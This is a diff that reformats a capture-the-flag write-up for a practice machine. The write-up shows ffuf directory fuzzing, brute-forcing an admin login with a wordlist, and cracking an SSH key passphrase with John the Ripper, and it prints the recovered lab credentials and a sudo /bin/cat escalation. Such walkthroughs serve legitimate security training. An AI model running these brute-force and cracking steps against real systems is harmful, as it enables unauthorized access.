@@ -120,7 +120,7 @@ The scan reveals two open ports:
 
 ## Web Enumeration & Directory Fuzzing
 
-Since we have a web server running on port 80 displaying the default Apache page, let's fuzz for hidden directories using ffuf and the SecLists combined_directories wordlist.
+Since we have a web server running on port `80` displaying the default Apache page, let's fuzz for hidden directories using `ffuf` and the *SecLists* combined_directories wordlist.
 
 ```bash
 ❯ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt -u http://10.10.138.181/FUZZ
@@ -148,13 +148,13 @@ ________________________________________________
 admin                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 4696ms]
 :: Progress: [1355/1377725] :: Job [1/1] :: 167 req/sec :: Duration: [0:00:13] :: Errors: 0 ::^[WARN] Caught keyboard interrupt (Ctrl-C)
 ```
-Excellent. We found an /admin directory.
+Excellent. We found an `/admin` directory.
 
 ## Web Login Brute-Forcing
 
-Navigating to [http://10.10.138.181/admin/](http://10.10.138.181/admin/) presents us with a login page. By inspecting the page source, we find a hint revealing that the username is admin.
+Navigating to [http://10.10.138.181/admin/](http://10.10.138.181/admin/) presents us with a login page. By inspecting the page source, we find a hint revealing that the username is `admin`.
 
-Now that we have the username, we can use ffuf again to brute-force the password via a POST request. We will filter for a 302 redirect status code, which indicates a successful login.
+Now that we have the username, we can use ffuf again to brute-force the password via a POST request. We will filter for a `302` redirect status code, which indicates a successful login.
 
 ```bash
 ❯ ffuf -u http://10.10.138.181/admin/ -X POST -d "user=admin&pass=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/rockyou.txt  -mc 302
@@ -196,11 +196,11 @@ xavier                  [Status: 302, Size: 671, Words: 159, Lines: 29, Duration
 
 ## Cracking the SSH Key
 
-Logging into the admin dashboard with our newly found credentials (admin:xavier), we are greeted with an RSA private key belonging to the user john.
+Logging into the admin dashboard with our newly found credentials (`admin:xavier`), we are greeted with an RSA private key belonging to the user john.
 
-We save this key to our local machine as john.rsa and modify its permissions so SSH will accept it (chmod 600 john.rsa). However, the key is encrypted with a passphrase. We need to crack it.
+We save this key to our local machine as john.rsa and modify its permissions so SSH will accept it (`chmod 600 john.rsa`). However, the key is encrypted with a passphrase. We need to crack it.
 
-First, we use ssh2john to convert the key into a format John the Ripper can understand:
+First, we use `ssh2john` to convert the key into a format John the Ripper can understand:
 
 ```bash
 ❯ ssh2john john.rsa > johntocrack
@@ -222,7 +222,7 @@ rockinroll       (john.rsa)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-John successfully cracks the passphrase: rockinroll.
+John successfully cracks the passphrase: *rockinroll*.
 
 ## System Access & Privilege Escalation
 With the private key and its passphrase in hand, we can SSH into the machine as john.
@@ -262,9 +262,9 @@ User john may run the following commands on bruteit:
     (root) NOPASSWD: /bin/cat
 ```
 
-We can run the /bin/cat command as root without a password!
+We can run the `/bin/cat` command as root without a password!
 
-A quick check on GTFOBins (a curated list of Unix binaries that can be exploited to bypass local security restrictions) tells us exactly how to weaponize this: If the binary is allowed to run as superuser by sudo, it does not drop elevated privileges and can be used to access the file system.
+A quick check on *GTFOBins* (a curated list of Unix binaries that can be exploited to bypass local security restrictions) tells us exactly how to weaponize this: If the binary is allowed to run as superuser by sudo, it does not drop elevated privileges and can be used to access the file system.
 
 > \[!TIP]+ Mentor's tip
 > ***Sudo***:
